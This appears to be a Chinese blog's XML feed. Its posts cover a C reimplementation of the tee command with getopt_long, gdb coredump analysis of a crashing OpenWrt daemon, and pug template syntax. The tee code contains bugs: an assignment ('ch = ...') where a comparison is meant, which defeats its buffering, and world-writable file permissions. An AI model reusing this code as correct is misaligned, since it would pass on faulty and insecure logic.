<p>使用<code>setvbuf</code>, <code>setbuf</code>等函数可以设置<code>stdio</code>流的缓冲模式，甚至禁用缓冲；以<code>O_SYNC</code>方式打开文件，可以在立即将数据同步至磁盘文件。</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ol>
<li>《Linux/UNIX系统编程手册》 第13章 文件I/O缓冲</li>
<li><a href="http://www.pixelbeat.org/programming/stdio_buffering/" target="_blank" rel="noopener">buffering in standard streams</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> stdio </tag>
            
            <tag> cache </tag>
            
            <tag> buffer </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux指令 - tee的实现]]></title>
      <url>https://www.litreily.top/2018/09/27/tee/</url>
      <content type="html"><![CDATA[<p>近日学习<a href="https://book.douban.com/subject/25809330/" target="_blank" rel="noopener">《Linux/UNIX 系统编程手册》</a>一书，巩固了C语言中一些常用库函数的使用，主要涉及基本IO操作相关的库函数。为了加深理解，手动实现了Linux系统中的<code>tee</code>指令的功能。借此文记述实现过程。</p>
<h2 id="tee功能简述"><a href="#tee功能简述" class="headerlink" title="tee功能简述"></a>tee功能简述</h2><p><code>tee</code>类似于一个单输入双输出的三通管道，将标准输入的数据输出到指定文件和标准输出中。为实现这个指令，主要考虑以下几点：</p>
<ol>
<li>解析<code>tee</code>包含的命令行参数</li>
<li>读取标准输入数据，并将数据写入标准输出和指定文件</li>
<li>若未指定文件，则仅将数据输出到标准输出</li>
</ol>
<p>下面逐步分析每个要点的实现方法。</p>
<h2 id="参数解析"><a href="#参数解析" class="headerlink" title="参数解析"></a>参数解析</h2><p><code>tee</code>包含以下可选项，本文实现仅考虑<code>-a</code>,<code>--version</code>,<code>--help</code></p>
<pre><code class="sh">Usage: tee [OPTION]... [FILE]...
Copy standard input to each FILE, and also to standard output.

  -a, --append              append to the given FILEs, do not overwrite
  -i, --ignore-interrupts   ignore interrupt signals
  -p                        diagnose errors writing to non pipes
      --output-error[=MODE]   set behavior on write error.  See MODE below
      --help     display this help and exit
      --version  output version information and exit
</code></pre>
<p>为解析命令行的<strong>可选项</strong>，需要用到库函数<code>getopt</code>或<code>getopt_long</code>，前者仅支持短格式，后者支持长短格式。下面对使用这两个函数解析参数的方法进行对比。</p>
<h3 id="getopt"><a href="#getopt" class="headerlink" title="getopt"></a>getopt</h3><p><code>getopt</code>函数声明及相关参数如下：</p>
<pre><code class="c">#include &lt;unistd.h&gt;

int getopt(int argc, char * const argv[],
            const char *optstring);

extern char *optarg;
extern int optind, opterr, optopt;
</code></pre>
<ul>
<li><code>argc</code>: 与main函数的argc一致，代表参数个数</li>
<li><code>argv</code>: 与main函数的argv一致，代表参数值</li>
<li><code>optstring</code>: 可选项字符串，如<code>a:bc:d:</code>，参数后带冒号代表该选项需要给定参数值</li>
<li><code>optarg</code>: 存储可选项的参数值，如果不带参数则为NULL</li>
<li><code>optind</code>: 存储下一个可选参数的索引，每执行一次<code>getopt</code>就加1</li>
<li><code>opterr</code>: 错误提示标志，默认为1，当输入参数无效时，会给出提示</li>
<li><code>optopt</code>: 是对可选参数字符的一个备份，当输入的参数无效时可用</li>
</ul>
<p>下面使用<code>getopt</code>实现对选项<code>-a</code>的解析：</p>
<pre><code class="c">int main(int argc, char *argv[])
{
    int opt, fd = -1;
    int flag_append = 0;
    int flags = O_WRONLY | O_CREAT;

    while((opt = getopt(argc, argv, &quot;a&quot;))!=-1) {
        switch(opt){
            case &#39;a&#39;:
                flag_append = 1;
                break;
            case &#39;?&#39;:
            default:
                exit(EXIT_FAILURE);
                break;
        }
    }

    if(optind &lt; argc){
        flags += flag_append ? O_APPEND:O_TRUNC;
        fd = open(argv[optind], flags, S_IRUSR | S_IWUSR
                    | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);
        if(fd == -1){
            printf(&quot;invaild file -- \&quot;%s\&quot;\n&quot;, argv[optind]);
            exit(EXIT_FAILURE);
        }
    }

    output(fd);
    if(fd &gt; 0)
        close(fd);

    return 0;
}
</code></pre>
<p>以上代码结合<code>while</code>、 <code>switch</code>，使用<code>getopt</code>循环获取和分析可选项。当前只对一个可选项<code>a</code>进行了解析，当包含<code>-a</code>可选项时，flag_append设为1，之后根据该标志为文件的打开方式添加<code>O_APPEND</code>标志，后面读写数据时就会以附加的方式在文件尾部开始写入。</p>
<pre><code class="c">    if(optind &lt; argc){
        flags += flag_append ? O_APPEND:O_TRUNC;
        fd = open(argv[optind], flags, S_IRUSR | S_IWUSR
                | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);
        //...
</code></pre>
<p>说明：  </p>
<ol>
<li>如果不带<code>-a</code>，程序默认会以<code>O_TRUNC</code>方式打开文件，表示截断，会以重写的方式覆盖原文件；</li>
<li><code>optind</code>小于<code>argc</code>时，说明除了可选参数之外，用户还输入了其它参数，这里对应的是<code>tee</code>指令所需的文件名称。此时argv[optind]刚好对应第一个非可选参数。</li>
</ol>
<h3 id="getopt-long"><a href="#getopt-long" class="headerlink" title="getopt_long"></a>getopt_long</h3><p><code>getopt_long</code>定义如下：</p>
<pre><code class="c">#include &lt;getopt.h&gt;

int getopt_long(int argc, char * const argv[],
            const char *optstring,
            const struct option *longopts, int *longindex);
</code></pre>
<p>与<code>getopt</code>相比，多了两个参数<code>longopts</code>, <code>longindex</code></p>
<ul>
<li><code>longopts</code>: 长格式可选项，<code>option</code>结构体指针</li>
</ul>
<pre><code class="c">struct option {
    const char *name;       // 名称，如&quot;help&quot;
    int         has_arg;    // 带参标志，0 或 1
    int        *flag;       // 常设为NULL，若非NULL,将会把val值存入flag
    int         val;        // getopt_long的返回值或将存入flag的值
};
</code></pre>
<p>当<code>flag</code>为NULL时，<code>getopt_long</code>返回<code>val</code>，否则返回0,并将<code>val</code>值存入<code>flag</code></p>
<ul>
<li><code>longindex</code>: 用于存储当前解析的长选项在<code>longopts</code>中的索引值(0,1,...)，通常设为<code>NULL</code></li>
</ul>
<p>下面使用<code>getopt_long</code>实现对选项<code>--help</code>，<code>--version</code>, <code>-a</code>的解析：</p>
<pre><code class="c">int main(int argc, char *argv[])
{
    int opt, fd = -1;
    int flag_append = 0;
    int flags = O_WRONLY | O_CREAT;

    struct option opts[] = {
        {&quot;append&quot;, 0, NULL, &#39;a&#39;},
        {&quot;help&quot;, 0, NULL, &#39;h&#39;},
        {&quot;version&quot;, 0, NULL, &#39;v&#39;}
    };

    while((opt = getopt_long(argc, argv, &quot;:av&quot;,opts, NULL))!=-1) {
        switch(opt){
            case &#39;a&#39;:
                flag_append = 1;
                break;
            case &#39;h&#39;:
                usage();
                break;
            case &#39;v&#39;:
                printf(VERSION&quot;\n&quot;);
                exit(EXIT_FAILURE);
                break;
            case &#39;?&#39;:
                printf(&quot;tee: invaild option -- &#39;%c&#39;\n&quot;
                    &quot;Try &#39;tee --help&#39; for more infomation.\n&quot;, optopt);
            default:
                exit(EXIT_FAILURE);
                break;
        }
    }

    if(optind &lt; argc){
        flags += flag_append ? O_APPEND:O_TRUNC;
        fd = open(argv[optind], flags, S_IRUSR | S_IWUSR
            | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);
        if(fd == -1){
            printf(&quot;invaild file -- \&quot;%s\&quot;\n&quot;, argv[optind]);
            exit(EXIT_FAILURE);
        }
    }

    output(fd);
    if(fd &gt; 0)
        close(fd);

    return 0;
}
</code></pre>
<p>以上代码中，长格式选项数组如下：</p>
<pre><code class="c">    struct option opts[] = {
        {&quot;append&quot;, 0, NULL, &#39;a&#39;},
        {&quot;help&quot;, 0, NULL, &#39;h&#39;},
        {&quot;version&quot;, 0, NULL, &#39;v&#39;}
    };
</code></pre>
<p>可以看到，当用户分别输入<code>--append</code>,<code>--help</code>,<code>--version</code>时，<code>getopt_long</code>分别返回<code>a</code>，<code>h</code>，<code>v</code>三个字符。</p>
<p>但注意<code>while((opt = getopt_long(argc, argv, &quot;:av&quot;,opts, NULL))!=-1)</code>只包含了<code>av</code>两个参数，所以当用户输入<code>-h</code>时，程序会认为是无效参数，也就是说<code>--help</code>在这里只支持长格式，而其它两个支持长短两种方式。</p>
<p>这也是指令的某些选项仅支持长格式的实现方法之一了，其它方法可参考函数<code>getopt_long_only</code></p>
<blockquote>
<p>说明：<br><code>:av</code>最前面的冒号可以起到<code>opterr=0</code>的效果，就是在参数无效时不给出默认提示</p>
</blockquote>
<h3 id="usage"><a href="#usage" class="headerlink" title="usage"></a>usage</h3><p><a href="#getopt_long">getopt_long</a>提到的<code>--help</code>选项是绝大多数指令都会实现的，用于提供帮助信息，下面是<code>tee</code>的<code>--help</code>输出。</p>
<pre><code class="c">void usage(){
    printf(&quot;Usage: tee [OPTION]... [FILE]\n&quot;
        &quot;Copy standard input to each FILE, and also to standard output.\n\n&quot;
        &quot;  -a, --append   append to the given FILEs, do not overwrite\n&quot;
        &quot;  -v, --version  output version information and exit\n&quot;
        &quot;      --help     display this help and exit\n&quot;
    );
    exit(EXIT_FAILURE);
}
</code></pre>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>关于参数解析，说到底就是<code>getopt</code>或<code>getopt_long</code>的应用。以上提到的可选参数中，其实也就<code>-a</code>会影响后续写入文件的方式，其它两个长格式选项均用于打印信息，之后便直接退出了。</p>
<p>而非可选项也只考虑了一个待写入文件的文件名，暂不考虑同时多文件写入。</p>
<h2 id="数据读写"><a href="#数据读写" class="headerlink" title="数据读写"></a>数据读写</h2><p><code>tee</code>数据读写很简单，仅需不断读取标准输入(stdin)数据，然后写入标准输出(stdout)和文件中，直到无数据可读或遇到中断信号为止。</p>
<pre><code class="c">#define BUF_SIZE 512
void output(int fd)
{
    int i = 0;
    char buffer[BUF_SIZE] = {0};
    char ch;

    fflush(stdin);
    fflush(stdout);
    while(read(STDIN_FILENO, &amp;ch, 1) &gt; 0){ // read from stdin
        buffer[i++] = ch;
        if(ch = &#39;\n&#39; || i == BUF_SIZE){
            write(STDOUT_FILENO, buffer, i); // output to stdout
            if(fd &gt; 0) write(fd, buffer, i);
            memset(buffer, 0, sizeof(buffer));
            i = 0;
        }
    }
}
</code></pre>
<p><code>STDIN_FILENO</code>, <code>STDOUT_FILENO</code>分别对应标准输入和标准输出的文件描述符<code>0</code>, <code>1</code>。这两个加上标准错误输出<code>STDERR_FILENO</code>是所有应用程序默认打开的，所以无需手动<code>open</code>。</p>
<p>此外，输出函数<code>output</code>会判断传入的文件描述符是否有效，如果无效则不会写入文件，仅将数据输出至标准输出。</p>
<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;string.h&gt;
#include &lt;getopt.h&gt;

#define BUF_SIZE 512
#define VERSION &quot;litreily 1.0.0&quot;

void output(int fd)
{
    int i = 0;
    char buffer[BUF_SIZE] = {0};
    char ch;

    fflush(stdin);
    fflush(stdout);
    while(read(STDIN_FILENO, &amp;ch, 1) &gt; 0){
        buffer[i++] = ch;
        if(ch = &#39;\n&#39; || i == BUF_SIZE){
            write(STDOUT_FILENO, buffer, i); // output to stdout
            if(fd &gt; 0) write(fd, buffer, i);
            memset(buffer, 0, sizeof(buffer));
            i = 0;
        }
    }
}

void usage(){
    printf(&quot;Usage: tee [OPTION]... [FILE]\n&quot;
        &quot;Copy standard input to each FILE, and also to standard output.\n\n&quot;
        &quot;  -a, --append   append to the given FILEs, do not overwrite\n&quot;
        &quot;  -v, --version  output version information and exit\n&quot;
        &quot;      --help     display this help and exit\n&quot;
    );
    exit(EXIT_FAILURE);
}

int main(int argc, char *argv[])
{
    int opt, fd = -1;
    int flag_append = 0;
    int flags = O_WRONLY | O_CREAT;

    struct option opts[] = {
        {&quot;append&quot;, 0, NULL, &#39;a&#39;},
        {&quot;help&quot;, 0, NULL, &#39;h&#39;},
        {&quot;version&quot;, 0, NULL, &#39;v&#39;}
    };

    while((opt = getopt_long(argc, argv, &quot;:av&quot;,opts, NULL))!=-1) {
        switch(opt){
            case &#39;a&#39;:
                flag_append = 1;
                break;
            case &#39;h&#39;:
                usage();
                break;
            case &#39;v&#39;:
                printf(VERSION&quot;\n&quot;);
                exit(EXIT_FAILURE);
                break;
            case &#39;?&#39;:
                printf(&quot;tee: invaild option -- &#39;%c&#39;\n&quot;
                    &quot;Try &#39;tee --help&#39; for more infomation.\n&quot;, optopt);
            default:
                exit(EXIT_FAILURE);
                break;
        }
    }

    if(optind &lt; argc){
        flags += flag_append ? O_APPEND:O_TRUNC;
        fd = open(argv[optind], flags, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);
        if(fd == -1){
            printf(&quot;invaild file -- \&quot;%s\&quot;\n&quot;, argv[optind]);
            exit(EXIT_FAILURE);
        }
    }

    output(fd);
    if(fd &gt; 0)
        close(fd);

    return 0;
}
</code></pre>
<h2 id="指令测试"><a href="#指令测试" class="headerlink" title="指令测试"></a>指令测试</h2><p>使用<code>gcc</code>完成编译，得到<code>tee</code>可执行文件</p>
<pre><code class="sh">gcc tee.c -o tee
</code></pre>
<p>下面对指令进行测试：</p>
<pre><code class="sh">$ ./tee --help
Usage: tee [OPTION]... [FILE]
Copy standard input to each FILE, and also to standard output.

  -a, --append   append to the given FILEs, do not overwrite
  -v, --version  output version information and exit
      --help     display this help and exit
$ ./tee --version
litreily 1.0.0
$ ./tee -h
tee: invaild option -- &#39;h&#39;
Try &#39;tee --help&#39; for more infomation.
$ ./tee -v
litreily 1.0.0
$ ./tee -a -d
tee: invaild option -- &#39;d&#39;
Try &#39;tee --help&#39; for more infomation.
$ ./tee test.txt
1
1
22
22
$ cat test.txt
1
22
$ ./tee -a test.txt
4444
4444
55555
55555
$ cat test.txt
1
22
4444
55555
$ ls | ./tee test.txt
main.c
Makefile
README.md
tee
tee.c
test.txt
$ cat test.txt
main.c
Makefile
README.md
tee
tee.c
test.txt
</code></pre>
<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ol>
<li><a href="http://man.linuxde.net/tee" target="_blank" rel="noopener">tee命令</a></li>
<li><a href="http://blog.zhangjikai.com/2016/03/05/%E3%80%90C%E3%80%91%E8%A7%A3%E6%9E%90%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0--getopt%E5%92%8Cgetopt_long/" target="_blank" rel="noopener">解析命令行参数--getopt和getopt_long</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[OpenWrt中使用gdb分析coredump]]></title>
      <url>https://www.litreily.top/2018/09/20/coredump/</url>
      <content type="html"><![CDATA[<p>近日调试一个<code>bug</code>，一个守护进程在特定情况下执行一段程序后便会挂掉。为了分析<code>bug</code>产生原因，本人使用了printf, strace追踪，gdb调试等诸多调试工具和测试方法。本文对于在<code>OpenWrt</code>嵌入式系统中启用<code>gdb</code>功能及其使用方法进行详细说明。</p>
<h2 id="调试背景"><a href="#调试背景" class="headerlink" title="调试背景"></a>调试背景</h2><p>我最先通过<code>strace</code>工具追踪发现进程是在收到<code>SIGABRT</code>信号后被<code>kill</code>的。</p>
<pre><code class="c">pipe([8, 9])                            = 0
fcntl64(8, F_GETFL)                     = 0 (flags O_RDONLY)
ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbe90a454) = -1 EINVAL (Invalid argument)
rt_sigprocmask(SIG_UNBLOCK, [ABRT], NULL, 8) = 0
tgkill(14189, 14189, SIGABRT)             = 0
--- SIGABRT (Aborted) @ 0 (0) ---
Process 14189 detached
</code></pre>
<p>由以上信息可知，进程在执行某个管道<code>pipe</code>相关操作时被<code>kill</code>，通常是在执行<code>popen</code>函数会出现<code>pipe</code>调用。之后对源码<code>grep -rn popen</code>， 并结合<code>strace</code>打印的出错前的信息可以大致定位到可能出错的位置，然后通过添加<code>printf</code>打印<code>log</code>，根据重现时停止打印<code>log</code>的地方精确定位到源码出错位置。</p>
<pre><code class="C">// config.c
char * config_get(char *name) {
    FILE *fp;
    char cmd[128]={0};
    snprintf(cmd, sizeof(cmd)-1, &quot;config get %s&quot;, name);
    fp = popen(cmd, &quot;r&quot;);   // 出错位置
    // ...
}
</code></pre>
<p>至此，仅仅能判断出用户态的出错位置，但从此处代码尚无法明确出错的根本原因，还需抓取内核态的出错信息，此时便需要使用<code>GDB</code>对进程出错时系统生成的<code>coredump</code>文件进行分析了。</p>
<h2 id="编译gdb以及带symbols的程序"><a href="#编译gdb以及带symbols的程序" class="headerlink" title="编译gdb以及带symbols的程序"></a>编译gdb以及带symbols的程序</h2><p>在分析之前，需要被调试进程的二进制文件包含<code>GDB</code>分析所需的<code>symbols</code>，什么是<code>symbols</code>? 粗略的讲，就是一张嵌入待调试进程的二进制文件中的映射表，包含代码中的变量、函数名、行号等信息。详见<a href="https://www.tutorialspoint.com/gnu_debugger/gdb_debugging_symbols.htm" target="_blank" rel="noopener">GDB-Debugging Symbols</a></p>
<h3 id="配置编译参数"><a href="#配置编译参数" class="headerlink" title="配置编译参数"></a>配置编译参数</h3><p><code>OpenWrt</code>编译参数存于<code>.config</code>文件中，<code>OpenWrt</code>默认并未打开<code>gdb</code>功能以及<code>debug</code>调试功能，我们可以通过<code>make menuconfig</code>选择参数或者手动更改配置文件。</p>
<pre><code class="sh"># .config
CONFIG_DEBUG=y # 使能调试功能，启用后会给集成GDB调试所需的symbols
CONFIG_NO_STRIP=y # 禁用strip，防止程序代码被打乱
#CONFIG_USE_SSTRIP=y
CONFIG_TOOLCHAINOPTS=y # 使能交叉工具链可选功能，这是编译GDB功能的总开关
</code></pre>
<p>配置完成后重新编译交叉工具链，用以得到<code>gdb</code>工具</p>
<pre><code class="sh">make toolchain/{compile,install} V=s
</code></pre>
<h3 id="编译单个模块-package"><a href="#编译单个模块-package" class="headerlink" title="编译单个模块(package)"></a>编译单个模块(package)</h3><p>参考<code>OpenWrt</code>官方<a href="https://wiki.openwrt.org/doc/devel/gdb?s[]=gdb" target="_blank" rel="noopener">文档</a>，可以使用以下指令单独为一个模块添加<code>debug symbols</code></p>
<pre><code class="sh">make package/traffic_meter/{clean,compile,install} V=99 CONFIG_DEBUG=y
</code></pre>
<h3 id="完整编译"><a href="#完整编译" class="headerlink" title="完整编译"></a>完整编译</h3><p>如果将全局<code>debug</code>开启，并进行完整编译，这会导致<code>image</code>过大（&gt;300M）而编译失败。当然啦，编译失败不要紧，因为只是没有生成<code>image</code>文件，但是所需模块和动态链接库都能正常编译完成，并不影响<code>coredump</code>文件的分析。</p>
<p>不过完整编译太过费时，不推荐，还是对需要调试的单个模块进行编译比较快捷和方便。</p>
<h2 id="获取coredump"><a href="#获取coredump" class="headerlink" title="获取coredump"></a>获取coredump</h2><p>得到了带有<code>symbols</code>的二进制文件，以及交叉编译得到的<code>gdb</code>调试工具，剩下的就是获取<code>coredump</code>文件</p>
<h3 id="配置coredump参数"><a href="#配置coredump参数" class="headerlink" title="配置coredump参数"></a>配置coredump参数</h3><pre><code class="sh">$ sudo vi /etc/profile
# 在文件末尾添加以下指令，以取消对coredump文件大小的限制
ulimit -c unlimited
$ source /etc/profile

# 设置coredump文件命名格式
# e - process name; p - pid; t - time
$ echo &quot;core-%e-%p-%t&quot; &gt; /proc/sys/kernel/core_pattern
</code></pre>
<p>关于<code>coredump</code>文件格式的参数说明，可以参考<a href="http://man7.org/linux/man-pages/man5/core.5.html" target="_blank" rel="noopener">core dump file</a></p>
<h3 id="重现bug并获取coredump文件"><a href="#重现bug并获取coredump文件" class="headerlink" title="重现bug并获取coredump文件"></a>重现bug并获取coredump文件</h3><p>首先重现bug，然后找到<code>coredump</code>文件，并传至编译服务器</p>
<pre><code class="sh">$ cd /
$ find . -name &quot;core-*&quot; |grep traffic_meter
./sbin/core-traffic_meter-14189-2895
$ cd sbin
$ tftp -pl core-traffic_meter-14189-2895 192.168.1.10
</code></pre>
<h2 id="GDB调试"><a href="#GDB调试" class="headerlink" title="GDB调试"></a>GDB调试</h2><h3 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h3><p>下面是常用的几个<code>gdb</code>指令</p>
<pre><code class="sh">(gdb) help
(gdb) where
(gdb) bt    # backtrace
(gdb) list  # [l] 显示当前调试处的相关代码
(gdb) up [num]  # 向上跳转1个或num个bt
(gdb) down [num]    # 向下跳转1个或num个bt
(gdb) print [variable]  # [p] 打印当前调试处相关变量的值
</code></pre>
<h3 id="调试实例"><a href="#调试实例" class="headerlink" title="调试实例"></a>调试实例</h3><pre><code class="sh">$ cd repo.git
$ cd build_dir/target-arm_v7=a_uClibc-0.9.33.2_eabi/root-ipq806x
$ ../../toolchain-arm_v7-a_gcc-4.6-linaro_uClibc-0.9.33.2_eabi/gdb-linaro-7.2-2011.03-0/gdb/gdb sbin/traffic_meter ~/core-traffic_meter-14189-28959-2895
GNU gdb (Linaro GDB) 7.2-2011.03-0
Copyright (C) 2010 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;
and &quot;show warranty&quot; for details.
This GDB was configured as &quot;--host=x86_64-linux-gnu --target=arm-openwrt-linux-uclibcgnueabi&quot;.
For bug reporting instructions, please see:
&lt;http://bugs.launchpad.net/gdb-linaro/&gt;...
Reading symbols from /home/litreily/R7500v2-Fortify.git/build_dir/target-arm_v7-a_uClibc-0.9.33.2_eabi/root-ipq806x/sbin/traffic_meter...done.

warning: exec file is newer than core file.
[New Thread 14189]
Reading symbols from /home/litreily/R7500v2-Fortify.git/build_dir/target-arm_v7-a_uClibc-0.9.33.2_eabi/root-ipq806x/lib/libgcc_s.so.1...done.
Loaded symbols for /home/litreily/R7500v2-Fortify.git/build_dir/target-arm_v7-a_uClibc-0.9.33.2_eabi/root-ipq806x/lib/libgcc_s.so.1
Reading symbols from /home/litreily/R7500v2-Fortify.git/build_dir/target-arm_v7-a_uClibc-0.9.33.2_eabi/root-ipq806x/lib/libc.so.0...done.
Loaded symbols for /home/litreily/R7500v2-Fortify.git/build_dir/target-arm_v7-a_uClibc-0.9.33.2_eabi/root-ipq806x/lib/libc.so.0
Reading symbols from /home/litreily/R7500v2-Fortify.git/build_dir/target-arm_v7-a_uClibc-0.9.33.2_eabi/root-ipq806x/lib/ld-uClibc.so.0...done.
Loaded symbols for /home/litreily/R7500v2-Fortify.git/build_dir/target-arm_v7-a_uClibc-0.9.33.2_eabi/root-ipq806x/lib/ld-uClibc.so.0
Core was generated by `traffic_meter -w brwan -p ppp0 -m /dev/mtd15`.
Program terminated with signal 6, Aborted.
#0  0x402fb4fc in raise (sig=6) at libpthread/nptl/sysdeps/unix/sysv/linux/raise.c:67
67        int res = INLINE_SYSCALL (tgkill, 3, pid, selftid, sig);
(gdb) bt
#0  0x402fb4fc in raise (sig=6) at libpthread/nptl/sysdeps/unix/sysv/linux/raise.c:67
#1  0x402f579c in abort () at libc/stdlib/abort.c:89
#2  0x402f5060 in __malloc_consolidate (av=0x4030b3e8) at libc/stdlib/malloc-standard/free.c:234
#3  __malloc_consolidate (av=0x4030b3e8) at libc/stdlib/malloc-standard/free.c:170
#4  0x402f4854 in malloc (bytes=&lt;value optimized out&gt;) at libc/stdlib/malloc-standard/malloc.c:908
#5  0x402d6250 in _stdio_fopen (fname_or_mode=&lt;value optimized out&gt;, mode=&lt;value optimized out&gt;, stream=0x8ca0e8, filedes=8) at libc/stdio/_fopen.c:177
#6  0x402d4fb4 in popen (command=0x8 &lt;Address 0x8 out of bounds&gt;, modes=0xfc08 &quot;r&quot;) at libc/stdio/popen.c:83
#7  0x0000f488 in config_get (name=&lt;value optimized out&gt;) at config.c:11
#8  0x0000ed48 in get_bogus_time_region (ct=60744, st=0xbe9f8994, btr=0xbe9f896c) at util.c:184
#9  0x0000e8f0 in get_traffic_from_flash (tfm=0xbe9f8738, ct=2894) at spi_flash.c:912
#10 0x0000ccb0 in restart_traffic_counter (tfm=0xbe9f8738, ct=52400) at trafficmeter.c:976
#11 0x0000a1f4 in main (argc=&lt;value optimized out&gt;, argv=&lt;value optimized out&gt;) at trafficmeter.c:1798
(gdb)
</code></pre>
<blockquote>
<p><strong>BackTrace (bt) 输出</strong>  </p>
<p>#num memory_addr in function (arg1=val1, arg2=val2,...) at file.c:line<br><code>bt</code>输出前面的编号是进程执行时的压栈顺序，编号越小越底层。编号后面紧跟的是内存地址，从地址大小可以看出哪些是内核调用，哪些是用户调用。  </p>
<p><strong>注意：</strong>由于编译器优化缘故，某些变量会显示<code>value optimized out</code>，如果想获取真实值，需要在编译时添加<code>-O0</code>，用以禁用编译器优化</p>
</blockquote>
<p>从<code>bt</code>结果可以看出，进程是在执行动态内存分配函数<code>malloc</code>时检测到错误，并执行<code>abort</code>函数触发<code>SIGABRT</code>信号后退出的。那就可以确定是内存问题，多半是内存多次释放或是未释放导致的。</p>
<p>据此线索，检查代码中与内存分配和释放相关的部分，最终调试发现是某处代码引用指针错误，并在之后使用<code>free</code>释放内存，而该指针指向的内存在多处地方被重新分配和释放，导致内存出现不可预料的问题。</p>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>在分析<code>coredump</code>时，需要注意以下几点：</p>
<ol>
<li>交叉编译后的<code>GDB</code>可执行文件位于<code>build_dir/toolchain-arm_v7-a_gcc-4.6-linaro_uClibc-0.9.33.2_eabi/gdb-linaro-7.2-2011.03-0/gdb/gdb</code></li>
<li>注意当前调试路径最好是在编译完成后的根目录<code>root-ipq806x</code>, 否则<code>GDB</code>可能无法找到动态链接库的位置，从而无法找到库函数的<code>symbols</code>，此时可能出现以下情况</li>
</ol>
<pre><code class="sh">warning: exec file is newer than core file.
[New Thread 14189]

warning: Could not load shared library symbols for 3 libraries, e.g. /lib/libgcc_s.so.1.
Use the &quot;info sharedlibrary&quot; command to see the complete listing.
Do you need &quot;set solib-search-path&quot; or &quot;set sysroot&quot;?

warning: Unable to find dynamic linker breakpoint function.
GDB will be unable to debug shared library initializers
and track explicitly loaded dynamic code.
Core was generated by `traffic_meter -w brwan -p ppp0 -m /dev/mtd15`.
Program terminated with signal 6, Aborted.
#0  0x402fb4fc in ?? ()
Setting up the environment for debugging gdb.
Function &quot;internal_error&quot; not defined.
Make breakpoint pending on future shared library load? (y or [n]) [answered N; input not from terminal]
Function &quot;info_command&quot; not defined.
Make breakpoint pending on future shared library load? (y or [n]) [answered N; input not from terminal]
.gdbinit:8: Error in sourced command file:
Argument required (one or more breakpoint numbers).
(gdb) info sharedlibrary
From        To          Syms Read   Shared Object Library
                        No          /lib/libgcc_s.so.1
                        No          /lib/libc.so.0
                        No          /lib/ld-uClibc.so.0
(gdb) bt
#0  0x402fb4fc in ?? ()
#1  0x402f579c in ?? ()
#2  0x402f579c in ?? ()
Backtrace stopped: previous frame identical to this frame (corrupt stack?)
</code></pre>
<p>若出现以上情况，我们得不到任何有效信息，此时可以通过提示的<code>set solib-search-path</code>或<code>set sysroot</code>手动设置库路径或根目录路径。但我仍建议在调试前<code>cd</code>到根目录。</p>
<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ol>
<li><a href="https://blog.51cto.com/terrytong914/1905041" target="_blank" rel="noopener">Linux coredump解决流程</a></li>
<li><a href="https://wiki.openwrt.org/doc/devel/gdb?s[]=gdb" target="_blank" rel="noopener">GNU Debugger</a></li>
<li><a href="https://www.tutorialspoint.com/gnu_debugger/gdb_debugging_symbols.htm" target="_blank" rel="noopener">GDB - Debugging Symbols</a></li>
<li><a href="http://man7.org/linux/man-pages/man5/core.5.html" target="_blank" rel="noopener">Core dump file</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[网页模板pug基本语法]]></title>
      <url>https://www.litreily.top/2018/08/31/pug-synax/</url>
      <content type="html"><![CDATA[<blockquote>
<p>Pug – robust, elegant, feature rich template engine for Node.js</p>
</blockquote>
<p><code>pug</code>原名<code>jade</code>,因版权问题更名为<code>pug</code>,即哈巴狗。与<code>hexo</code>默认模块<code>ejs</code>一样，<code>pug</code>也是一个模板引擎，可用于快速的网站开发，当然也可以用于静态博客网站的设计。本站点现时所用主题<code>manupassant</code>也使用了<code>pug</code>。</p>
<a id="more"></a>
<p>本文针对<code>Hexo</code>中使用<code>pug</code>的情况为例，说明其基本语法。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><pre><code class="sh"># common install
npm install pug

# install for hexo blog
npm install hexo-renderer-pug --save
</code></pre>
<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p><code>pug</code>不同于<code>html</code>，前者不需要标签的开和闭，如<code>html</code>的<code>&lt;p&gt;Demo&lt;/p&gt;</code>，在<code>pug</code>使用<code>p Demo</code>即可。</p>
<h3 id="缩进"><a href="#缩进" class="headerlink" title="缩进"></a>缩进</h3><p><code>pug</code>对空格敏感，有点类似<code>python</code>对制表符<code>tab</code>敏感。<code>pug</code>使用空格作为缩进符，当然用soft tab也可行。同一级标签需保证左对齐。</p>
<pre><code class="pug">div
    p Hello, world!
    p Hello, pug.
</code></pre>
<p>渲染结果如下：</p>
<pre><code class="html">&lt;div&gt;
